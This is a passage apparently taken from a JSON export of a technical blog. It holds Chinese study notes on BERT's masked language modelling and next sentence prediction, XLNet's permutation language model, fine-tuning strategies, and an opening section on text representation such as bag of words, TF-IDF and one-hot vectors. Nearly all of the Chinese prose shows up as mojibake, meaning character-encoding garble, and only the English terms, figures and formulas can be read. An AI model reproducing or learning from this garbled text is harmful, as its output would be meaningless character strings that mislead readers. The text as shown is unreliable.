å†³å®šçš„ã€‚æ˜¾ç„¶å¥å­ä¸­æœ‰çš„å•è¯çš„è¯­ä¹‰ä¼šåŒæ—¶ä¾èµ–äºå®ƒå·¦å³ä¸¤ä¾§çš„æŸäº›è¯ï¼Œä»…ä»…ä»å•æ–¹å‘åšencodingæ˜¯ä¸èƒ½æè¿°æ¸…æ¥šçš„ã€‚ 2. Mask-LM (Mask-Language Model) â€‹ å°†å•å‘é¢„æµ‹çš„LMæ”¹å˜ä¸ºåŒå‘çš„LMï¼Œé¢„æµ‹ç›®æ ‡å˜ä¸ºä»€ä¹ˆï¼Ÿ â€‹ ä¸ºäº†åˆ©ç”¨åŒå‘ä¿¡æ¯ï¼Œæ”¹è¿›äº†æ™®é€šè¯­è¨€æ¨¡å‹æˆä¸ºå®Œå½¢å¡«ç©ºå¼çš„ Mask-LM (Mask-Language Model)ï¼Œéšæœºé€‰å–15%çš„è¯è¿›è¡ŒMaskï¼Œç„¶åé¢„æµ‹ã€‚ è¾“å…¥åºåˆ—ä¾ç„¶å’Œæ™®é€šTransformerä¿æŒä¸€è‡´ï¼Œåªä¸è¿‡æŠŠæŒ–æ‰çš„ä¸€ä¸ªè¯ç”¨\"[MASK]\"æ›¿æ¢ è¾“å‡ºå±‚åœ¨è¢«æŒ–æ‰çš„è¯ä½ç½®ï¼Œæ¥ä¸€ä¸ªåˆ†ç±»å±‚åšè¯å…¸å¤§å°ä¸Šçš„åˆ†ç±»é—®é¢˜ï¼Œå¾—åˆ°è¢« mask æ‰çš„è¯æ¦‚ç‡å¤§å° â€‹ BERT é’ˆå¯¹å¦‚ä½•åšâ€œ[MASK]â€ï¼Œåšäº†ä¸€äº›æ›´æ·±å…¥çš„ç ”ç©¶ï¼Œå®ƒåšäº†å¦‚ä¸‹å¤„ç†ï¼š é€‰å–è¯­æ–™ä¸­æ‰€æœ‰è¯çš„ 15% è¿›è¡Œéšæœº maskï¼› é€‰ä¸­çš„è¯åœ¨ 80% çš„æ¦‚ç‡ä¸‹è¢«çœŸå® maskï¼› é€‰ä¸­çš„è¯åœ¨ 10% çš„æ¦‚ç‡ä¸‹ä¸åš maskï¼Œè€Œè¢«éšæœºæ›¿æ¢æˆå…¶ä»–ä¸€ä¸ªè¯ï¼› é€‰ä¸­çš„è¯åœ¨ 10% çš„æ¦‚ç‡ä¸‹ä¸åš maskï¼Œä»ç„¶ä¿ç•™åŸæ¥çœŸå®çš„è¯ã€‚ 3. Next Sentence Prediction ä»»åŠ¡å­¦ä¹ å¥å­çº§åˆ«ä¿¡æ¯ â€‹ å…·ä½“åšæ³•åˆ™æ˜¯å°†ä¸¤ä¸ªå¥å­ç»„åˆæˆä¸€ä¸ªåºåˆ—ï¼Œç»„åˆæ–¹å¼ä¼šæŒ‰ç…§ä¸‹é¢å°†è¦ä»‹ç»çš„æ–¹å¼ï¼Œç„¶åè®©æ¨¡å‹é¢„æµ‹è¿™ä¸¤ä¸ªå¥å­æ˜¯å¦ä¸ºå…ˆåè¿‘é‚»çš„ä¸¤ä¸ªå¥å­ï¼Œä¹Ÿå°±æ˜¯ä¼šæŠŠ\"Next Sentence Prediction\"é—®é¢˜å»ºæ¨¡æˆä¸ºä¸€ä¸ªäºŒåˆ†ç±»é—®é¢˜ã€‚ â€‹ å¥å­çº§è´Ÿé‡‡æ ·ï¼š â€‹ è®­ç»ƒçš„æ—¶å€™ï¼Œæ•°æ®ä¸­æœ‰ 50% çš„æƒ…å†µè¿™ä¸¤ä¸ªå¥å­æ˜¯å…ˆåå…³ç³»ï¼Œè€Œå¦å¤– 50% çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸¤ä¸ªå¥å­æ˜¯éšæœºä»è¯­æ–™ä¸­å‡‘åˆ°ä¸€èµ·çš„ï¼Œä¹Ÿå°±æ˜¯ä¸å…·å¤‡å…ˆåå…³ç³»ï¼Œä»¥æ­¤æ¥æ„é€ è®­ç»ƒæ•°æ®ã€‚ â€‹ Multi-task: â€‹ åœ¨é¢„è®­ç»ƒé˜¶æ®µï¼Œå› ä¸ºæœ‰ä¸¤ä¸ªä»»åŠ¡éœ€è¦è®­ç»ƒï¼šMask-LM å’Œ Next Sentence Prediction è¾“å…¥è¡¨ç¤º â€‹ èµ·å§‹æ ‡è®°éƒ½ç”¨â€œ[CLS]â€æ¥è¡¨ç¤ºï¼Œç»“æŸæ ‡è®°ç¬¦ç”¨\"[SEP]\"è¡¨ç¤ºï¼Œå¯¹äºä¸¤ä¸ªå¥å­çš„è¾“å…¥æƒ…å†µï¼Œé™¤äº†èµ·å§‹æ ‡è®°å’Œç»“æŸæ ‡è®°ä¹‹å¤–ï¼Œä¸¤ä¸ªå¥å­é—´é€šè¿‡\"[SEP]\"æ¥è¿›è¡ŒåŒºåˆ†ã€‚ ç”¨ä¸¤ä¸ªå‘é‡è¡¨ç¤ºå½“å‰æ˜¯å¥å­ A æˆ–å¥å­ B çš„ã€‚å¼•å…¥äº†â€œsegment embeddingâ€çš„æ¦‚å¿µæ¥åŒºåˆ†å¥å­ã€‚ å¼•å…¥åºåˆ—ä¸­è¯çš„ä½ç½®ä¿¡æ¯ï¼Œä¹Ÿç”¨äº† position embeddingã€‚å’ŒTransformerçš„sinã€coså‡½æ•°ç¼–ç ä¸åŒï¼Œç›´æ¥å»è®­ç»ƒäº†ä¸€ä¸ªposition embeddingã€‚ç»™æ¯ä¸ªä½ç½®è¯ä¸€ä¸ªéšæœºåˆå§‹åŒ–çš„è¯å‘é‡ï¼Œå†è®­ç»ƒã€‚ [CLS]ä½œä¸ºå¥å­/å¥å¯¹çš„è¡¨ç¤ºæ˜¯ç›´æ¥è·Ÿåˆ†ç±»å™¨çš„è¾“å‡ºå±‚è¿æ¥çš„ã€‚ ä¸‹æ¸¸ä»»åŠ¡ â€‹ NLPçš„å››å¤§ä»»åŠ¡ï¼š å¯¹äºå•åºåˆ—æ–‡æœ¬åˆ†ç±»ä»»åŠ¡å’Œåºåˆ—å¯¹çš„æ–‡æœ¬åˆ†ç±»ä»»åŠ¡ä½¿ç”¨æ¡†æ¶åŸºæœ¬ä¸€è‡´ï¼Œåˆ©ç”¨ Encoder æœ€åä¸€å±‚çš„ç¬¬ä¸€ä¸ªæ—¶åˆ»â€œ[CLS]â€å¯¹åº”çš„è¾“å‡ºä½œä¸ºåˆ†ç±»å™¨çš„è¾“å…¥ å¯¹äº SQuAD 1.1 ä»»åŠ¡æ¥è¯´ï¼Œéœ€è¦åœ¨ç»™å®šæ®µè½ä¸­æ‰¾åˆ°æ­£ç¡®ç­”æ¡ˆæ‰€åœ¨åŒºé—´ï¼Œè¿™æ®µåŒºé—´é€šè¿‡ä¸€ä¸ªèµ·å§‹ç¬¦ä¸ç»ˆæ­¢ç¬¦æ¥è¿›è¡Œæ ‡è®° åºåˆ—æ ‡æ³¨ä»»åŠ¡ä¸Šè¿›è¡Œ finetuneï¼Œå¯¹äºåºåˆ—ä¸­çš„æ¯ä¸ª token è€Œè¨€ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªåˆ†ç±»ä»»åŠ¡ã€‚å’Œå‰é¢æåˆ°çš„æ™®é€šåˆ†ç±»ä»»åŠ¡ä¸ä¸€æ ·çš„æ˜¯ï¼Œè¿™é‡Œçš„åˆ†ç±»éœ€è¦é’ˆå¯¹åºåˆ—ä¸­çš„æ¯ä¸ªè¯åšåˆ†ç±»ï¼Œå‚æ•°å¢åŠ åœ¨ H Ã— K ï¼Œè¿™é‡Œçš„ K æ˜¯åºåˆ—æ ‡æ³¨ä¸­æ ‡æ³¨çš„ç§ç±»ä¸ªæ•°ã€‚ å¯¹äº SWAG ä»»åŠ¡æ¥è®²ï¼Œå› ä¸ºéœ€è¦åœ¨ç»™å®šä¸€ä¸ªå¥å­åï¼Œä»å››ä¸ªå€™é€‰å¥å­ä¸­é€‰æ‹©ä¸€ä¸ªæœ€æœ‰å¯èƒ½æ˜¯è¯¥å¥å­çš„ä¸‹ä¸€ä¸ªå¥å­ï¼Œè¿™é‡Œé¢é€šå¸¸åŒ…å«äº†ä¸€äº›å¸¸è¯†æ¨ç†ã€‚å°†å‰ç½®å¥å­å’Œå››ä¸ªå€™é€‰å¥å­åˆ†åˆ«è¿›è¡Œç»„åˆæˆä¸€ä¸ªå¥å­å¯¹, ç»™æ¯ä¸€ä¸ªå€™é€‰å¥å­è¿›è¡Œæ‰“åˆ†ï¼Œä»è€Œå¾—åˆ°å››ä¸ªå€™é€‰å¥å­ä¸­æœ€æœ‰å¯èƒ½æ˜¯ä¸‹ä¸€ä¸ªçš„å¥å­ã€‚ image â€‹ å¯¹æ¯”å‚æ•°åŠè®­ç»ƒ image XLNet â€‹ åœ¨ä¸¤é˜¶æ®µæ–°æ¨¡å¼ï¼ˆé¢„è®­ç»ƒ+Finetuningï¼‰ä¸‹ï¼Œåº”è¯¥ä¼šæœ‰æ›´å¤šçš„å¥½å·¥ä½œæ¶Œç°å‡ºæ¥ã€‚æ ¹æœ¬åŸå› åœ¨äºï¼šè¿™ä¸ªæ¨¡å¼çš„æ½œåŠ›è¿˜æ²¡æœ‰è¢«å……åˆ†æŒ–æ˜ï¼Œè²Œä¼¼è¿˜æœ‰å¾ˆå¤§çš„æå‡ç©ºé—´ã€‚ â€‹ XLNetå¼•å…¥äº†è‡ªå›å½’è¯­è¨€æ¨¡å‹ä»¥åŠè‡ªç¼–ç è¯­è¨€æ¨¡å‹çš„æ–¹æ³•ã€‚ è‡ªå›å½’è¯­è¨€æ¨¡å‹ï¼ˆAutoregressive LMï¼‰ â€‹ è‡ªå·¦å‘å³é¢„æµ‹ä¸‹ä¸€ä¸ªè¯çš„è¯­è¨€æ¨¡å‹ä»»åŠ¡ï¼Œæˆ–è€…åè¿‡æ¥è‡ªå³å‘å·¦ï¼Œè¿™ç§ç±»å‹çš„LMè¢«ç§°ä¸ºè‡ªå›å½’è¯­è¨€æ¨¡å‹ã€‚ â€‹ GPT å°±æ˜¯å…¸å‹çš„è‡ªå›å½’è¯­è¨€æ¨¡å‹ã€‚ELMoæ˜¯åˆ†åˆ«æœ‰ä¸¤ä¸ªæ–¹å‘çš„è‡ªå›å½’LMï¼Œç„¶åæŠŠLSTMçš„ä¸¤ä¸ªæ–¹å‘çš„éšèŠ‚ç‚¹çŠ¶æ€æ‹¼æ¥åˆ°ä¸€èµ·ï¼Œä½“ç°åŒå‘è¯­è¨€æ¨¡å‹ã€‚å…¶å®æ˜¯ä¸¤ä¸ªè‡ªå›å½’è¯­è¨€æ¨¡å‹çš„æ‹¼æ¥ï¼Œæœ¬è´¨ä¸Šä»ç„¶æ˜¯è‡ªå›å½’è¯­è¨€æ¨¡å‹ã€‚ ä¼˜ç‚¹ ä¸‹æ¸¸NLPä»»åŠ¡æœ‰å…³ï¼Œæ¯”å¦‚ç”Ÿæˆç±»NLPä»»åŠ¡ï¼Œæ–‡æœ¬æ‘˜è¦ï¼Œæœºå™¨ç¿»è¯‘ç­‰ï¼Œåœ¨å®é™…ç”Ÿæˆå†…å®¹çš„æ—¶å€™ï¼Œå°±æ˜¯ä»å·¦å‘å³çš„ï¼Œè‡ªå›å½’è¯­è¨€æ¨¡å‹å¤©ç„¶åŒ¹é…è¿™ä¸ªè¿‡ç¨‹ã€‚ Bertè¿™ç§DAEæ¨¡å¼ï¼Œåœ¨ç”Ÿæˆç±»NLPä»»åŠ¡ä¸­ï¼Œå°±é¢ä¸´è®­ç»ƒè¿‡ç¨‹å’Œæ¨æ–­è¿‡ç¨‹ï¼ˆæ²¡æœ‰Maskï¼‰ä¸ä¸€è‡´çš„é—®é¢˜ï¼Œå¯¼è‡´ç”Ÿæˆç±»çš„NLPä»»åŠ¡åˆ°ç›®å‰ä¸ºæ­¢éƒ½åšä¸å¤ªå¥½ã€‚ PSï¼š DAEï¼ˆDA Enhancedï¼‰ï¼ŒDenoising Autoencoderï¼šé‚£äº›è¢«Maskæ‰çš„å•è¯å°±æ˜¯åœ¨è¾“å…¥ä¾§åŠ å…¥çš„æ‰€è°“å™ªéŸ³ã€‚ç±»ä¼¼Bertè¿™ç§é¢„è®­ç»ƒæ¨¡å¼ï¼Œè¢«ç§°ä¸ºDAE LM AoA, å±‚å å¼æ³¨æ„åŠ›æœºåˆ¶ï¼ˆAttention-over-Attentionï¼‰ ç¼ºç‚¹ â€‹ åªèƒ½åˆ©ç”¨ä¸Šæ–‡æˆ–è€…ä¸‹æ–‡çš„ä¿¡æ¯ï¼Œä¸èƒ½åŒæ—¶åˆ©ç”¨ä¸Šæ–‡å’Œä¸‹æ–‡çš„ä¿¡æ¯ï¼Œä½†æ˜¯è¿™åœ¨sequence inferenceè¿™ç±»ä»»åŠ¡ä¸­å´æ›´ç¬¦åˆå®é™…ã€‚ELMoè¿™ç§åŒå‘éƒ½åšï¼Œå› ä¸ºèåˆæ¨¡å¼è¿‡äºç®€å•ï¼Œæ‰€ä»¥æ•ˆæœå…¶å®å¹¶ä¸æ˜¯å¤ªå¥½ã€‚ â€‹ GPT 2.0çš„ä½œè€…å´åšæŒæ²¿ç”¨GPT 1.0 å•å‘è¯­è¨€æ¨¡å‹çš„æ—§ç“¶ï¼Œè£…è¿›å»äº†æ›´é«˜è´¨é‡æ›´å¤§è§„æ¨¡é¢„è®­ç»ƒæ•°æ®çš„æ–°é…’ã€‚ image â€‹ è€Œå®ƒçš„å®éªŒç»“æœä¹Ÿè¯´æ˜äº†ï¼Œå¦‚æœæƒ³æ”¹å–„é¢„è®­ç»ƒè¯­è¨€æ¨¡å‹ï¼Œèµ°è¿™æ¡æ‰©å……é¢„åºåˆ—æ¨¡å‹è®­ç»ƒæ•°æ®çš„è·¯å­ï¼Œæ˜¯ä¸ªå¤šå¿«å¥½ä½†æ˜¯ä¸çœé’±çš„æ–¹å‘ã€‚ è‡ªç¼–ç è¯­è¨€æ¨¡å‹ï¼ˆAutoencoder LMï¼‰ â€‹ DAE LMçš„ä¼˜ç¼ºç‚¹æ­£å¥½å’Œè‡ªå›å½’LMåè¿‡æ¥ï¼Œå®ƒèƒ½æ¯”è¾ƒè‡ªç„¶åœ°èå…¥åŒå‘è¯­è¨€æ¨¡å‹ã€‚ â€‹ Bertçš„ç¼ºç‚¹ï¼Œä¸»è¦åœ¨è¾“å…¥ä¾§å¼•å…¥[Mask]æ ‡è®°ï¼Œå¯¼è‡´é¢„è®­ç»ƒé˜¶æ®µå’ŒFine-tuningé˜¶æ®µä¸ä¸€è‡´çš„é—®é¢˜ï¼Œå› ä¸ºFine-tuningé˜¶æ®µæ˜¯çœ‹ä¸åˆ°[Mask]æ ‡è®°çš„ã€‚ â€‹ XLNetçš„å‡ºå‘ç‚¹å°±æ˜¯ï¼š èƒ½å¦èåˆè‡ªå›å½’LMå’ŒDAE LMä¸¤è€…çš„ä¼˜ç‚¹ã€‚ å¦å¤–ä¸€ä¸ªæ˜¯ï¼ŒBertåœ¨ç¬¬ä¸€ä¸ªé¢„è®­ç»ƒé˜¶æ®µï¼Œå‡è®¾å¥å­ä¸­å¤šä¸ªå•è¯è¢«Maskæ‰ï¼Œè¿™äº›è¢«Maskæ‰çš„å•è¯ä¹‹é—´æ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œæ˜¯æ¡ä»¶ç‹¬ç«‹çš„ï¼Œè€Œæœ‰æ—¶å€™è¿™äº›å•è¯ä¹‹é—´æ˜¯æœ‰å…³ç³»çš„ï¼ŒXLNetåˆ™è€ƒè™‘äº†è¿™ç§å…³ç³» â€‹ XLNetå…±æœ‰ä¸‰ä¸ªå› ç´ ï¼š Permutation Language Model(ç®€ç§°PLM)ï¼šå°†åŒå‘ä¿¡æ¯å­¦ä¹ æ–¹å¼ï¼Œç”±é¢„æµ‹[Mask]ï¼Œå˜æˆå¯¹åºåˆ—è¿›è¡Œå…¨æ’åˆ—ï¼Œæ ¹æ®æ¯ç§å¯èƒ½æ’åºç”±å‰t - 1ä¸ªè¯é¢„æµ‹ç¬¬tä¸ªè¯ã€‚æ¥èå…¥åŒå‘è¯­è¨€æ¨¡å‹ã€‚ å¼•å…¥äº†Transformer-XLï¼šç›¸å¯¹ä½ç½®ç¼–ç ä»¥åŠåˆ†æ®µRNNæœºåˆ¶ã€‚ç›¸å¯¹ä½ç½®ç¼–ç å…³æ³¨ç›¸å¯¹ä½ç½®åå·®ã€‚åˆ†æ®µRNNæœºåˆ¶ï¼Œå°†é•¿æ–‡æœ¬åˆ’åˆ†ä¸ºè¾ƒçŸ­çš„æ–‡æœ¬è¾“å…¥transformerï¼Œå°†transformerå•å…ƒä½œä¸ºRNNçš„cellï¼Œè¿›è¡ŒRNNæ–¹å¼çš„åºåˆ—è¿ç®—è¿æ¥ã€‚ å¢åŠ äº†é¢„è®­ç»ƒé˜¶æ®µä½¿ç”¨çš„æ•°æ®è§„æ¨¡ï¼šBertä½¿ç”¨çš„é¢„è®­ç»ƒæ•°æ®æ˜¯BooksCorpuså’Œè‹±æ–‡Wikiæ•°æ®ï¼Œå¤§å°13Gã€‚XLNeté™¤äº†ä½¿ç”¨è¿™äº›æ•°æ®å¤–ï¼Œå¦å¤–å¼•å…¥äº†Giga5ï¼ŒClueWebä»¥åŠCommon Crawlæ•°æ®ï¼Œå¹¶æ’æ‰äº†å…¶ä¸­çš„ä¸€äº›ä½è´¨é‡æ•°æ®ï¼Œå¤§å°åˆ†åˆ«æ˜¯16G,19Gå’Œ78Gã€‚å¯ä»¥çœ‹å‡ºï¼Œåœ¨é¢„è®­ç»ƒé˜¶æ®µæå¤§æ‰©å……äº†æ•°æ®è§„æ¨¡ï¼Œå¹¶å¯¹è´¨é‡è¿›è¡Œäº†ç­›é€‰è¿‡æ»¤ã€‚ â€‹ å¯¹äºé•¿æ–‡æ¡£çš„åº”ç”¨ï¼ŒBertå› ä¸ºTransformerå¤©ç„¶å¯¹é•¿æ–‡æ¡£ä»»åŠ¡å¤„ç†æœ‰å¼±ç‚¹ï¼Œæ‰€ä»¥XLNetå¯¹äºé•¿æ–‡æ¡£NLPä»»åŠ¡ç›¸æ¯”Bertåº”è¯¥æœ‰ç›´æ¥ä¸”æ¯”è¾ƒæ˜æ˜¾çš„æ€§èƒ½æå‡ä½œç”¨ï¼Œå®ƒåœ¨è®ºæ–‡ä¸­ä¹Ÿè¯æ˜äº†è¿™ç‚¹ã€‚ æ€»ç»“ â€‹ å¦‚ä½•ä½¿ç”¨è¿™äº›é¢„è®­ç»ƒå¥½çš„æ¨¡å‹ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¯ä»¥æœ‰ä¸‰ç§æ–¹å¼æ¥ä½¿ç”¨ï¼š å°†é¢„è®­ç»ƒæ¨¡å‹å½“åšä¸€ä¸ªç‰¹å¾æå–å™¨ï¼Œç›´æ¥å°†é¢„è®­ç»ƒæ¨¡å‹çš„è¾“å‡ºå±‚å»æ‰ï¼Œç„¶åä½¿ç”¨å»æ‰è¾“å‡ºå±‚ä¹‹åçš„æœ€åä¸€å±‚è¾“å‡ºä½œä¸ºç‰¹å¾ï¼Œè¾“å…¥åˆ°æˆ‘ä»¬è‡ªå·±ç²¾å¿ƒè®¾è®¡å¥½çš„ Task-specific æ¨¡å‹ä¸­å»ã€‚ åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œä½œä¸ºç‰¹å¾æå–å™¨çš„éƒ¨åˆ†ï¼ˆæ¯”å¦‚ BERT Encoderï¼‰çš„å‚æ•°æ˜¯ä¸å˜çš„ã€‚ å°†é¢„è®­ç»ƒæ¨¡å‹æ•´ä½“æ¥å…¥ Task-specific æ¨¡å‹ï¼Œç»§è€Œé‡æ–°åœ¨æ–°çš„æ•°æ®é›†ä¸Šæ•´ä½“é‡æ–°è®­ç»ƒã€‚ å½“ç„¶è®­ç»ƒæŠ€å·§å¯ä»¥æœ‰å¾ˆå¤šç§ï¼Œæ¯”å¦‚ ULMFiT çš„ä¸‰è§’å­¦ä¹ ç‡å’Œé€å±‚è§£å†»æˆ–è€…æ˜¯ Transformer çš„ warmup ç­–ç•¥ï¼ˆä¸Šæ–‡éƒ½æœ‰æåˆ°ï¼‰ï¼Œè¿™äº›è®­ç»ƒæŠ€å·§éå¸¸é‡è¦ï¼Œéœ€è¦å¥½å¥½æŠŠæ§ï¼Œå¦åˆ™å¾ˆå®¹æ˜“å­¦å´©äº†ï¼Œç”šè‡³è®©åŸæœ‰é¢„è®­ç»ƒè¯­è¨€æ¨¡å‹çš„ä¼˜åŠ¿éƒ½è¢«æ–°çš„ finetune æŠ¹å»äº†ï¼Œå› æ­¤éœ€è¦å®éªŒè®¾è®¡ä¸€ä¸ªæ¯”è¾ƒå¥½çš„ finetune ç­–ç•¥ã€‚ ä¿ç•™é¢„è®­ç»ƒæ¨¡å‹çš„ä¸€éƒ¨åˆ†ï¼Œå¦å¤–ä¸€éƒ¨åˆ†åˆ™å’Œ Task-specific æ¨¡å‹ä¸€èµ· finetuneã€‚ è®­ç»ƒæ•°æ®ä¸ç®—å¤ªå¤šçš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™ä¸€æ–¹é¢è¦ä¿è¯é¢„è®­ç»ƒæ¨¡å‹åœ¨å¤§è§„æ¨¡è¯­æ–™ä¸Šæ›¾ç»å­¦ä¹ åˆ°çš„è¡¨å¾ï¼Œå¦ä¸€æ–¹é¢å› ä¸ºåˆè¦åšæ–°æ•°æ®ä¸‹çš„è¿ç§»ï¼Œä½†æ˜¯æ•°æ®é‡æ¯”è¾ƒå°‘ï¼Œé‡æ–° finetune æ•´ä¸ªæ¨¡å‹å¯èƒ½ä¸å¤ªåˆé€‚ï¼Œå®¹æ˜“å¯¼è‡´æ¨¡å‹çš„é²æ£’æ€§ä¸é«˜ï¼Œé‚£ä¹ˆä¼¼ä¹é€‰æ‹©æœ€åçš„ä¸€äº›å±‚è¿›è¡Œé€‰æ‹©æ€§çš„ finetune ä¼šæ˜¯æ¯”è¾ƒå¥½çš„æ–¹æ¡ˆ â€‹ ä»¥ BERT ä¸ºä»£è¡¨çš„æ¨¡å‹ï¼Œç®€å•ç²—æš´ï¼Œä¸äººç±»è¯­è¨€ä¹ å¾—è¿‡ç¨‹ä¸­çš„è½»é‡ã€æ³›åŒ–å’Œä½åŠŸè€—æˆªç„¶ç›¸åã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"BERT","slug":"BERT","permalink":"https://racleray.github.io/tags/BERT/"},{"name":"representation","slug":"representation","permalink":"https://racleray.github.io/tags/representation/"},{"name":"pretrained LM","slug":"pretrained-LM","permalink":"https://racleray.github.io/tags/pretrained-LM/"},{"name":"XLNet","slug":"XLNet","permalink":"https://racleray.github.io/tags/XLNet/"}]},{"title":"æ–‡æœ¬è¡¨ç¤º","slug":"æ–‡æœ¬è¡¨ç¤º","date":"2020-07-06T15:11:07.000Z","updated":"2023-08-07T11:54:31.045Z","comments":true,"path":"posts/2af352b4.html","link":"","permalink":"https://racleray.github.io/posts/2af352b4.html","excerpt":"è®¡ç®—æœºåšä¸åˆ°ç›´æ¥å¯¹æ–‡æœ¬å­—ç¬¦ä¸²è¿›è¡Œè¯­ä¹‰ç†è§£å’Œè¡¨ç¤ºï¼Œå› æ­¤éœ€è¦è¿›è¡Œæ•°å€¼åŒ–æˆ–è€…å‘é‡åŒ–ã€‚è‰¯å¥½çš„æ–‡æœ¬è¡¨ç¤ºå½¢å¼å¯ä»¥æå¤§çš„æå‡æœºå™¨å­¦ä¹ ç®—æ³•æ•ˆæœã€‚è®°å½•ä¸€ä¸‹å¸¸è§çš„æ–‡æœ¬è¡¨ç¤ºæ–¹æ³•ã€‚","text":"æ–‡æœ¬è¡¨ç¤º â€‹ è®¡ç®—æœºåšä¸åˆ°ç›´æ¥å¯¹æ–‡æœ¬å­—ç¬¦ä¸²è¿›è¡Œè¯­ä¹‰ç†è§£å’Œè¡¨ç¤ºï¼Œå› æ­¤éœ€è¦è¿›è¡Œæ•°å€¼åŒ–æˆ–è€…å‘é‡åŒ–ã€‚è‰¯å¥½çš„æ–‡æœ¬è¡¨ç¤ºå½¢å¼å¯ä»¥æå¤§çš„æå‡æœºå™¨å­¦ä¹ ç®—æ³•æ•ˆæœã€‚ 1.è¡¨ç¤ºæ–¹æ³• ç¦»æ•£è¡¨ç¤º one-hotè¡¨ç¤º multi-hotè¡¨ç¤º åˆ†å¸ƒå¼è¡¨ç¤º åŸºäºçŸ©é˜µ åŸºäºé™ç»´çš„æ–¹æ³• åŸºäºèšç±»çš„æ–¹æ³• åŸºäºç¥ç»ç½‘ç»œ CBOW Skip-gram NNLM C&amp;W 2.æ–‡æœ¬ç¦»æ•£è¡¨ç¤º bag of words â€‹ å°†å­—ç¬¦ä¸²è§†ä¸ºä¸€ä¸ª â€œè£…æ»¡å­—ç¬¦ï¼ˆè¯ï¼‰çš„è¢‹å­â€ ï¼Œè¢‹å­é‡Œçš„ è¯è¯­æ˜¯éšä¾¿æ‘†æ”¾çš„ã€‚ â€‹ [1,0,1,1,1,0,0,1,â€¦] -- å‘é‡çš„æ¯ä¸ªç»´åº¦å”¯ä¸€å¯¹åº”ç€è¯è¡¨ä¸­çš„ä¸€ä¸ªè¯ã€‚å¯è§è¿™ä¸ªå‘é‡çš„å¤§éƒ¨åˆ†ä½ç½®æ˜¯0å€¼ï¼Œè¿™ç§æƒ…å†µå«ä½œâ€œç¨€ç–â€ã€‚ä¸ºäº†å‡å°‘å­˜å‚¨ç©ºé—´ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åªå‚¨å­˜éé›¶å€¼çš„ä½ç½®ã€‚ ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼š ç®€å•ï¼Œæ–¹ä¾¿ï¼Œå¿«é€Ÿ åœ¨è¯­æ–™å……è¶³çš„å‰æä¸‹ï¼Œå¯¹äºç®€å•çš„è‡ªç„¶è¯­è¨€å¤„ç†ä»»åŠ¡æ•ˆæœä¸é”™ã€‚å¦‚æ–‡æœ¬åˆ†ç±»ã€‚ ç¼ºç‚¹ï¼š å…¶å‡†ç¡®ç‡å¾€å¾€æ¯”è¾ƒä½ã€‚å‡¡æ˜¯å‡ºç°åœ¨æ–‡æœ¬ä¸­çš„è¯ä¸€è§†åŒä»ï¼Œä¸èƒ½ä½“ç°ä¸åŒè¯åœ¨ä¸€å¥è¯ä¸­çš„ä¸åŒçš„é‡è¦æ€§ã€‚ æ— æ³•å…³æ³¨è¯è¯­ä¹‹é—´çš„é¡ºåºå…³ç³»ï¼Œè¿™æ˜¯è¯è¢‹å­æ¨¡å‹æœ€å¤§çš„ç¼ºç‚¹ã€‚å¦‚â€œæ­¦æ¾æ‰“è€è™â€è·Ÿâ€œè€è™æ‰“æ­¦æ¾â€åœ¨è¯è¢‹å­æ¨¡å‹ä¸­æ˜¯è®¤ä¸ºä¸€æ ·çš„ã€‚ TF-IDF â€‹ è¯é¢‘â€”â€”TFï¼ˆterm frequencyï¼‰ï¼šåœ¨å½“å‰æ–‡æ¡£ä¸­çš„è¯é¢‘ â€‹ ç»Ÿè®¡é€†æ–‡æ¡£é¢‘ç‡â€”â€”IDFï¼šåŸºæœ¬å‡è®¾æ˜¯å¦‚æœä¸€ä¸ªè¯è¯­åœ¨ä¸åŒçš„æ–‡æ¡£ä¸­åå¤å‡ºç°ï¼Œé‚£ä¹ˆå®ƒå¯¹äºè¯†åˆ«è¯¥æ–‡æœ¬å¹¶ä¸é‡è¦ã€‚ â€‹ \\[-log({å‡ºç°è¯¥è¯è¯­çš„æ–‡æ¡£å æ€»æ–‡æ¡£å‡ºç°çš„é¢‘ç‡})\\] â€‹ IDFå¯ä»¥è¿›è¡Œå¹³æ»‘ï¼šå‡è®¾å­˜åœ¨ä¸€ä¸ªæ–‡æ¡£ï¼ŒåŒ…å«æ‰€æœ‰çš„è¯ã€‚è®¡ç®—IDFæ—¶ï¼Œåˆ†å­åˆ†æ¯éƒ½åŠ ä¸€ã€‚ 3.æ–‡æœ¬åˆ†å¸ƒå¼è¡¨ç¤º â€‹ one-hot vectorï¼šå‡è®¾æˆ‘ä»¬çš„è¯åº“æ€»å…±æœ‰nä¸ªè¯ï¼Œé‚£æˆ‘ä»¬å¼€ä¸€ä¸ª1*nçš„é«˜ç»´å‘é‡ã€‚ â€‹ \\[ w^{aardcark}= \\begin{bmatrix} â€‹ 1 \\\\ â€‹ 0 \\\\ â€‹ 0 \\\\ â€‹ \\vdots \\\\ â€‹ 0 \\end{bmatrix} , w^{a}= \\begin{bmatrix} â€‹ 0 \\\\ â€‹ 1 \\\\ â€‹ 0 \\\\ â€‹ \\vdots \\\\ â€‹ 0 \\end{bmatrix}\\] â€‹ å‘é‡æ²¡åŠæ³•ç»™æˆ‘ä»¬ä»»ä½•å½¢å¼çš„è¯ç»„ç›¸ä¼¼æ€§æƒè¡¡ã€‚ä¾‹å¦‚: â€‹ \\[(w^{hotel})^Tw^{motel}=0\\] â€‹ ä¸€ä¸ªæé«˜ç»´åº¦çš„ç©ºé—´ï¼Œç„¶åæ¯ä¸ªè¯è¯­éƒ½ä¼šå æ®ä¸€ä¸ªç»´åº¦ï¼Œå› æ­¤æ²¡æœ‰åŠæ³•åœ¨ç©ºé—´ä¸­å…³è”èµ·æ¥ã€‚ åŸºäºSVDé™ç»´çš„è¡¨ç¤ºæ–¹æ³• â€‹ 